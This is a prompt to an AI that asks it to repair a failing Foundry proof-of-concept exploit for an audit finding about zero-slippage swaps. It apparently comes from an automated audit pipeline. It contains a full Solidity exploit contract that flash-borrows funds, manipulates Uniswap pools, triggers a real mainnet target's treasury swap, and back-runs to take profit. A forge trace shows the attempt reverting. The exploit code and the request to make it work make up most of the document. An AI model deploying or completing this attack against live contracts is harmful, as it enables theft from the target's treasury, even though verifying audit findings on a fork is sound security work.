You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: All swaps use zero minimum output, enabling price-manipulation extraction
- claim: Every live Uniswap V2 and V3 swap path sets `amountOutMin`/`amountOutMinimum` to zero and performs no independent price or slippage validation before trading the contract's full token balance.
- impact: An MEV searcher can manipulate the relevant pool immediately before execution, let the verifier trade at an arbitrarily bad rate, then back-run to restore price and capture most of the treasury value as profit.
- exploit_paths: ["Observe a pending `executeOnOpportunity()` transaction or call it directly after funding.", "Manipulate one of the pools used by `_swapV3All()` or `_swapV2Path()`.", "Let the verifier execute swaps with zero slippage protection.", "Back-run the pool to unwind the manipulation and keep the extracted value."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ITargetLike {
    function executeOnOpportunity() external;
}

interface IUniswapV3Factory {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address pool);
}

interface IQuoterV2Like {
    function quoteExactInputSingle(
        address tokenIn,
        address tokenOut,
        uint24 fee,
        uint256 amountIn,
        uint160 sqrtPriceLimitX96
    ) external returns (uint256 amountOut);
}

interface ISwapRouterV3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    struct ExactOutputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountOut;
        uint256 amountInMaximum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
    function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IBalancerVault {
    function flashLoan(address recipient, IERC20[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
}

interface IAaveV3Pool {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0x35D8949372D46B7a3D5A56006AE77B215fc69bC0;
    address internal constant USD0 = 0x73A15FeD60Bf67631dC6cd7Bc5B6e8da8190aCF5;
    address internal constant USUAL = 0xC4441c2BE5d8fA8126822B9929CA0b81Ea0DE38E;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    address internal constant UNIV3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
    address internal constant UNIV3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address internal constant UNIV3_QUOTER = 0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6;

    address internal constant UNIV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant UNIV2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant AAVE_V3_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

    uint8 internal constant VENUE_NONE = 0;
    uint8 internal constant VENUE_V3 = 1;
    uint8 internal constant VENUE_V2 = 2;

    address private _profitToken = WETH;
    uint256 private _profitAmount;

    struct Plan {
        address sourceToken;
        address manipulatedToken;
        uint24 manipulatedFee;
        uint8 venue;
        uint256 expectedVictimAmount;
        uint256 scoreWeth;
    }

    constructor() {}

    function executeOnOpportunity() external {
        _profitToken = WETH;
        _profitAmount = 0;

        uint256 wethBefore = _balanceOf(WETH, address(this));
        Plan[7] memory plans;
        uint256 count;

        address[7] memory candidates = [TARGET, USD0, USUAL, USDC, USDT, DAI, WBTC];
        for (uint256 i = 0; i < candidates.length; i++) {
            Plan memory plan = _buildPlan(candidates[i]);
            if (plan.venue != VENUE_NONE && plan.scoreWeth > 0 && plan.expectedVictimAmount > 0) {
                plans[count] = plan;
                unchecked {
                    ++count;
                }
            }
        }

        _sortPlans(plans, count);

        for (uint256 i = 0; i < count; i++) {
            uint256[5] memory amounts = _loanLadder(plans[i]);
            for (uint256 j = 0; j < amounts.length; j++) {
                uint256 loanAmount = amounts[j];
                if (loanAmount == 0) continue;

                (bool ok,) = address(this).call(
                    abi.encodeWithSelector(
                        this._attemptPlan.selector,
                        plans[i].sourceToken,
                        plans[i].manipulatedToken,
                        plans[i].manipulatedFee,
                        plans[i].venue,
                        loanAmount
                    )
                );
                if (ok) {
                    uint256 wethAfter = _balanceOf(WETH, address(this));
                    _profitAmount = wethAfter > wethBefore ? wethAfter - wethBefore : 0;
                    return;
                }
            }
        }

        uint256 wethAfterAll = _balanceOf(WETH, address(this));
        _profitAmount = wethAfterAll > wethBefore ? wethAfterAll - wethBefore : 0;
    }

    function _attemptPlan(
        address sourceToken,
        address manipulatedToken,
        uint24 fee,
        uint8 venue,
        uint256 loanAmount
    ) external {
        require(msg.sender == address(this), "self only");

        uint256 wethBefore = _balanceOf(WETH, address(this));
        bytes memory userData = abi.encode(sourceToken, manipulatedToken, fee, venue, loanAmount);

        bool balancerOk;
        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(manipulatedToken);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = loanAmount;

        try IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, userData) {
            balancerOk = true;
        } catch {}

        if (!balancerOk) {
            IAaveV3Pool(AAVE_V3_POOL).flashLoanSimple(address(this), manipulatedToken, loanAmount, userData, 0);
        }

        if (_balanceOf(WETH, address(this)) <= wethBefore) revert("no profit");
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        require(msg.sender == BALANCER_VAULT, "not balancer");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "bad flashloan");
        _executeSandwich(address(tokens[0]), amounts[0], feeAmounts[0], userData);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        require(msg.sender == AAVE_V3_POOL, "not aave");
        require(initiator == address(this), "bad initiator");
        _executeSandwich(asset, amount, premium, params);
        return true;
    }

    function _executeSandwich(address loanToken, uint256 amount, uint256 feeAmount, bytes memory userData) internal {
        (address sourceToken, address manipulatedToken, uint24 fee, uint8 venue, uint256 requestedAmount) = abi.decode(
            userData,
            (address, address, uint24, uint8, uint256)
        );

        require(loanToken == manipulatedToken && amount == requestedAmount, "loan mismatch");
        require(_balanceOf(sourceToken, TARGET) > 0, "no victim balance");
        require(venue == VENUE_V3 || venue == VENUE_V2, "bad venue");

        _forceApprove(manipulatedToken, UNIV3_ROUTER, type(uint256).max);
        _forceApprove(manipulatedToken, UNIV2_ROUTER, type(uint256).max);
        _forceApprove(WETH, UNIV3_ROUTER, type(uint256).max);
        _forceApprove(WETH, UNIV2_ROUTER, type(uint256).max);

        // Exploit path 0: directly call the live target after arranging temporary liquidity.
        // Exploit path 1: pre-manipulate a live pool used by the target's `_swapV3All()` or `_swapV2Path()`.
        if (venue == VENUE_V3) {
            _swapV3ExactIn(manipulatedToken, WETH, fee, amount);
        } else {
            _swapV2ExactIn(manipulatedToken, WETH, amount);
        }

        // Exploit path 2: the target performs its treasury sale with zero min-out protection.
        ITargetLike(TARGET).executeOnOpportunity();

        // Exploit path 3: back-run the same venue to restore price, repay the flashloan, and keep the spread.
        if (venue == VENUE_V3) {
            _swapV3ExactOut(WETH, manipulatedToken, fee, amount + feeAmount);
        } else {
            _swapV2ExactOut(WETH, manipulatedToken, amount + feeAmount);
        }

        if (msg.sender == BALANCER_VAULT) {
            _safeTransfer(manipulatedToken, msg.sender, amount + feeAmount);
        } else {
            _forceApprove(manipulatedToken, AAVE_V3_POOL, amount + feeAmount);
        }
    }

    function _buildPlan(address sourceToken) internal returns (Plan memory best) {
        uint256 sourceBal = _balanceOf(sourceToken, TARGET);
        if (sourceBal == 0) return best;

        best = _considerV3Direct(best, sourceToken, sourceBal);
        best = _considerV3TwoHop(best, sourceToken, sourceBal);
        best = _considerV2Direct(best, sourceToken, sourceBal);
    }

    function _considerV3Direct(Plan memory best, address sourceToken, uint256 sourceBal) internal returns (Plan memory) {
        uint24[4] memory fees = [uint24(100), uint24(500), uint24(3000), uint24(10000)];
        for (uint256 i = 0; i < fees.length; i++) {
            if (IUniswapV3Factory(UNIV3_FACTORY).getPool(sourceToken, WETH, fees[i]) == address(0)) continue;
            uint256 wethOut = _quoteV3(sourceToken, WETH, fees[i], sourceBal);
            if (wethOut > best.scoreWeth) {
                best = Plan({
                    sourceToken: sourceToken,
                    manipulatedToken: sourceToken,
                    manipulatedFee: fees[i],
                    venue: VENUE_V3,
                    expectedVictimAmount: sourceBal,
                    scoreWeth: wethOut
                });
            }
        }
        return best;
    }

    function _considerV3TwoHop(Plan memory best, address sourceToken, uint256 sourceBal) internal returns (Plan memory) {
        address[4] memory mids = [USDC, USDT, DAI, WBTC];
        uint24[4] memory fees = [uint24(100), uint24(500), uint24(3000), uint24(10000)];

        for (uint256 i = 0; i < mids.length; i++) {
            if (mids[i] == sourceToken) continue;
            for (uint256 j = 0; j < fees.length; j++) {
                if (IUniswapV3Factory(UNIV3_FACTORY).getPool(sourceToken, mids[i], fees[j]) == address(0)) continue;
                uint256 midOut = _quoteV3(sourceToken, mids[i], fees[j], sourceBal);
                if (midOut == 0) continue;

                for (uint256 k = 0; k < fees.length; k++) {
                    if (IUniswapV3Factory(UNIV3_FACTORY).getPool(mids[i], WETH, fees[k]) == address(0)) continue;
                    uint256 wethOut = _quoteV3(mids[i], WETH, fees[k], midOut);
                    if (wethOut > best.scoreWeth) {
                        best = Plan({
                            sourceToken: sourceToken,
                            manipulatedToken: mids[i],
                            manipulatedFee: fees[k],
                            venue: VENUE_V3,
                            expectedVictimAmount: midOut,
                            scoreWeth: wethOut
                        });
                    }
                }
            }
        }

        return best;
    }

    function _considerV2Direct(Plan memory best, address sourceToken, uint256 sourceBal) internal view returns (Plan memory) {
        if (sourceToken == WETH) return best;
        if (IUniswapV2Factory(UNIV2_FACTORY).getPair(sourceToken, WETH) == address(0)) return best;

        uint256 wethOut = _quoteV2(sourceToken, WETH, sourceBal);
        if (wethOut > best.scoreWeth) {
            best = Plan({
                sourceToken: sourceToken,
                manipulatedToken: sourceToken,
                manipulatedFee: 0,
                venue: VENUE_V2,
                expectedVictimAmount: sourceBal,
                scoreWeth: wethOut
            });
        }
        return best;
    }

    function _loanLadder(Plan memory plan) internal pure returns (uint256[5] memory ladder) {
        uint256 amount = plan.expectedVictimAmount;
        if (amount == 0) return ladder;

        ladder[0] = amount / 4;
        ladder[1] = amount / 2;
        ladder[2] = amount;
        ladder[3] = amount * 2;
        ladder[4] = amount * 4;

        for (uint256 i = 0; i < ladder.length; i++) {
            if (ladder[i] == 0) ladder[i] = amount;
        }
    }

    function _sortPlans(Plan[7] memory plans, uint256 count) internal pure {
        for (uint256 i = 0; i < count; i++) {
            for (uint256 j = i + 1; j < count; j++) {
                if (plans[j].scoreWeth > plans[i].scoreWeth) {
                    Plan memory tmp = plans[i];
                    plans[i] = plans[j];
                    plans[j] = tmp;
                }
            }
        }
    }

    function _quoteV3(address tokenIn, address tokenOut, uint24 fee, uint256 amountIn) internal returns (uint256 out) {
        if (tokenIn == tokenOut || fee == 0 || amountIn == 0) return 0;
        try IQuoterV2Like(UNIV3_QUOTER).quoteExactInputSingle(tokenIn, tokenOut, fee, amountIn, 0) returns (
            uint256 amountOut
        ) {
            out = amountOut;
        } catch {}
    }

    function _quoteV2(address tokenIn, address tokenOut, uint256 amountIn) internal view returns (uint256 out) {
        if (tokenIn == tokenOut || amountIn == 0) return 0;
        address[] memory path = _directPath(tokenIn, tokenOut);
        try IUniswapV2Router02(UNIV2_ROUTER).getAmountsOut(amountIn, path) returns (uint256[] memory amounts) {
            if (amounts.length > 1) out = amounts[amounts.length - 1];
        } catch {}
    }

    function _swapV3ExactIn(address tokenIn, address tokenOut, uint24 fee, uint256 amountIn) internal returns (uint256) {
        ISwapRouterV3.ExactInputSingleParams memory params = ISwapRouterV3.ExactInputSingleParams({
            tokenIn: tokenIn,
            tokenOut: tokenOut,
            fee: fee,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: amountIn,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        return ISwapRouterV3(UNIV3_ROUTER).exactInputSingle(params);
    }

    function _swapV3ExactOut(address tokenIn, address tokenOut, uint24 fee, uint256 amountOut) internal returns (uint256) {
        ISwapRouterV3.ExactOutputSingleParams memory params = ISwapRouterV3.ExactOutputSingleParams({
            tokenIn: tokenIn,
            tokenOut: tokenOut,
            fee: fee,
            recipient: address(this),
            deadline: block.timestamp,
            amountOut: amountOut,
            amountInMaximum: _balanceOf(tokenIn, address(this)),
            sqrtPriceLimitX96: 0
        });
        return ISwapRouterV3(UNIV3_ROUTER).exactOutputSingle(params);
    }

    function _swapV2ExactIn(address tokenIn, address tokenOut, uint256 amountIn) internal returns (uint256 amountOut) {
        address[] memory path = _directPath(tokenIn, tokenOut);
        uint256[] memory amounts = IUniswapV2Router02(UNIV2_ROUTER).swapExactTokensForTokens(
            amountIn,
            0,
            path,
            address(this),
            block.timestamp
        );
        amountOut = amounts[amounts.length - 1];
    }

    function _swapV2ExactOut(address tokenIn, address tokenOut, uint256 amountOut) internal returns (uint256 amountIn) {
        address[] memory path = _directPath(tokenIn, tokenOut);
        uint256[] memory amounts = IUniswapV2Router02(UNIV2_ROUTER).swapTokensForExactTokens(
            amountOut,
            _balanceOf(tokenIn, address(this)),
            path,
            address(this),
            block.timestamp
        );
        amountIn = amounts[0];
    }

    function _directPath(address tokenIn, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
    }

    function _balanceOf(address token, address owner) internal view returns (uint256 bal) {
        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20.balanceOf.selector, owner));
        if (!ok || ret.length < 32) return 0;
        bal = abi.decode(ret, (uint256));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer failed");
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "approve failed");
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _safeApprove(token, spender, 0);
        _safeApprove(token, spender, amount);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    receive() external payable {}
}

```

forge stdout (tail):
```
c756cc2000000000000000000000000000000000000000000)
    │   │   │   │   │   │   │   │   │   ├─ [11349] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640, 849323017224 [8.493e11])
    │   │   │   │   │   │   │   │   │   │   ├─ [10554] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640, 849323017224 [8.493e11]) [delegatecall]
    │   │   │   │   │   │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │   │   │   │   │   │        topic 2: 0x00000000000000000000000088e6a0c2ddd26feeb64f039a2c41296fcb3f5640
    │   │   │   │   │   │   │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000c5bf98c408
    │   │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   │   │   │   │   ├─ [1339] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640) [staticcall]
    │   │   │   │   │   │   │   │   │   ├─ [553] 0x43506849D7C04F9138D1A2050bbF3A0c054402dd::balanceOf(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640) [delegatecall]
    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 72739692263399 [7.273e13]
    │   │   │   │   │   │   │   │   │   └─ ← [Return] 72739692263399 [7.273e13]
    │   │   │   │   │   │   │   │   ├─  emit topic 0: 0xc42079f94a6350d7e6235f29174924f928cc2ac818eb64fed8004e115fbcca67
    │   │   │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000e592427a0aece92de3edee1f18e0157c05861564
    │   │   │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000c5bf98c408ffffffffffffffffffffffffffffffffffffffffffffffeef3bb5ecd7d73fb830000000000000000000000000000000000004b0fb0f3adc2ba842224bbb8933400000000000000000000000000000000000000000000000044e40f37dade397b000000000000000000000000000000000000000000000000000000000003029f
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000c5bf98c408ffffffffffffffffffffffffffffffffffffffffffffffeef3bb5ecd7d73fb83
    │   │   │   │   │   │   │   └─ ← [Return] 314478657918244488317 [3.144e20]
    │   │   │   │   │   │   ├─ [694] 0x35D8949372D46B7a3D5A56006AE77B215fc69bC0::executeOnOpportunity()
    │   │   │   │   │   │   │   ├─ [257] 0xe025d17562A62159E6731298c5A51ad444529354::executeOnOpportunity() [delegatecall]
    │   │   │   │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [328] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [327] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 1000000000000000000000000 [1e24])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 22575929 [2.257e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xe025d17562A62159E6731298c5A51ad444529354.executeOnOpportunity
  at 0x35D8949372D46B7a3D5A56006AE77B215fc69bC0.executeOnOpportunity
  at FlawVerifier.executeOperation
  at 0x34039100cc9584Ae5D741d322e16d0d18CEE8770
  at 0x9aEb8aAA1cA38634Aa8C0c8933E7fB4D61091327.flashLoanSimple
  at 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2.flashLoanSimple
  at FlawVerifier._attemptPlan
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 360.18s (358.42s CPU time)

Ran 1 test suite in 360.21s (360.18s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 33448937)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
